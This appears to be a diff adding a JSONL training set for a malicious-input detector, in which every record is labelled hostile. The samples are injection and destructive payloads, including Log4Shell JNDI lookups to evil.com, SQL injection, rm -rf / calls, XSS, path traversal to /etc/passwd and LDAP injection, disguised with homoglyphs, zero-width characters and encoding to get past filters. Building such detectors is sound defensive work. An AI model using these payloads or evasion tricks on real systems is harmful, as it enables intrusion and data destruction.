@@ -1,0 +1,873 @@
+{"text": "​隐藏​字符​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "аAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP​ TABLE ​users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "evаl('malicious    code')", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "eval('malicious    code')", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "java.lang.Runtime.getRuntime().exec('rm\\x20-rf\\x20/')", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "java.lang.Runtime.getRuntime().exec('rm -rf /')", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "UNION SELECT null, null, null FROM information_schema.tables", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "UNION SELECT null, null, null FROM information_schema.tables", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "${jndi:ldap://evil.com/a}​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec('rm​ -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eval('alert(1)')​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP​ TABLE ​users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid=*))(|(uid=*​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP  TABLе  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jNdi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "<script>alert('xss')</script>​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "exec('rm​ -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>alеrt('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/pаsswd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "​隐藏​字符‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "${jndi:ldap://evil.com/a}​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec('rm​ -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "evаl('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rM -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "​隐藏​字符​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import​ os; os.system('rm -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.423215"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "еval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP\\x20\\x20TABLE\\x20\\x20users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SеLECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm    -rf    /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec('rm​ -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT  *  FRоM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid=*))(|(uid=*‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm    -rf    /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec('rm​ -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>аlert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<ScRipt>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rM  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "еxec('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldap://evil.com/a}​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import​ os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.423215"}
+{"text": "*)(uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid%3D*))(|(uid%3D*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "eval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<ScRipt>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import\\x20\\x20os;\\x20\\x20os.system('rm\\x20\\x20-rf\\x20\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "еxec('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldap://еvil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import os; os.systеm('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "evаl('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "<script>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT * FROM users WHERE id%3D1 OR 1%3D1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>аlert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "jаva.lang.Runtime.getRuntime().exec('rm\\x20-rf\\x20/')", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "java.lang.Runtime.getRuntime().exec('rm\\x20-rf\\x20/')", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "DROP​ TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/pаsswd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT * FRоM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP  TABLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "rm​ -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../еtc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid%3D*))(|(uid%3D*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP​ TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "SELECT * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "jAvA.lang.Runtime.getRuntime().exec('rm\\x20-rf\\x20/')", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "java.lang.Runtime.getRuntime().exec('rm\\x20-rf\\x20/')", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "аAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "java.lang.Runtime.getRuntime().exec('rm  -rf  /')", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "java.lang.Runtime.getRuntime().exec('rm -rf /')", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "../../../еtc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "jAvA.lang.Runtime.getRuntime().exec('rm​  -rf  /')", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "java.lang.Runtime.getRuntime().exec('rm​  -rf  /')", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "<script>alert('xss')</script>​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "​隐藏​字符​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SеLECT * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldap://еvil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "еval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "SеLECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "../../../etc/passwd‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eval('malicious        code')", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "eval('malicious    code')", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SеLECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jNdi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid=*))(|(uid=*‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import\\x20\\x20os;\\x20\\x20os.system('rm\\x20\\x20-rf\\x20\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "impоrt  os;  os.system('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "SELECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP  TABLе  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SеLECT * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm​ -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP\\x20TABLE\\x20users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT  *  FROM  users  WHERE  id%3D1  OR  1%3D1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import​ os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm​ -rf ​/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP\\x20\\x20TABLE\\x20\\x20users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP  TABLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid%3D*))(|(uid%3D*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid=*))(|(uid=*‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldap://evil.com/a}‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>alеrt('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP​ TABLE ​users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "java.lang.Runtime.getRuntime().exec('rm\\x20-rf\\x20/')‌", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "java.lang.Runtime.getRuntime().exec('rm\\x20-rf\\x20/')", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "<script>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "impоrt  os;  os.system('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm​ -rf ​/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.423215"}
+{"text": "DROP​ TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<ScRipt>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>alеrt('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP  TABLе  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.423215"}
+{"text": "rM  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jNdi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jNdi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eval('alert(1)')‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "DROP​ TABLE ​users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec('rm​ -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldap://еvil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import  os;  os.system('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>alеrt('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "AaAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import\\x20os;\\x20os.system('rm\\x20-rf\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eVaL('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "${jNdi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import\\x20os;\\x20os.system('rm\\x20-rf\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eval('alert(1)')‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldаp://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR ​1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "*)(uid=*))(|(uid=*‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import  os;  os.system('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eval('alert(1)')​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR ​1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import​ os; os.system('rm -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "<script>alert('xss')</script>​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eval('alert(1)')​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rM  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "аAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm​ -rf ​/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eval('alert(1)')​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import  os;  os.system('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.423215"}
+{"text": "DROP  TABLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "impоrt os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SеLECT * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldap://еvil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "rM  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(Uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "AaAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rM  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid=*))(|(uid=*‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP  TаBLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "exec('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "​隐藏​字符​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec('rm​ -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>alert('xss')</script>​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>alеrt('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP​ TABLE ​users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "jAvA.lang.Runtime.getRuntime().exec('rm\\x20\\x20-rf\\x20\\x20/')", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "jAvA.lang.Runtime.getRuntime().exec('rm  -rf  /')", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "rm    -rf    /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import  os;  os.system('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "UNION  SELECT  null,  null,  null  FROM  informаtion_schema.tables", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "UNION  SELECT  null,  null,  null  FROM  information_schema.tables", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "impоrt  os;  os.system('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "еxec('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "<script>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "java.lang.Runtime.getRuntime().exec('rm​ -rf /')", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "java.lang.Runtime.getRuntime().exec('rm  -rf  /')", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "eval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import\\x20\\x20os;\\x20\\x20os.system('rm\\x20\\x20-rf\\x20\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP TаBLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm    -rf    /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "rm  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "​隐藏​字符‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
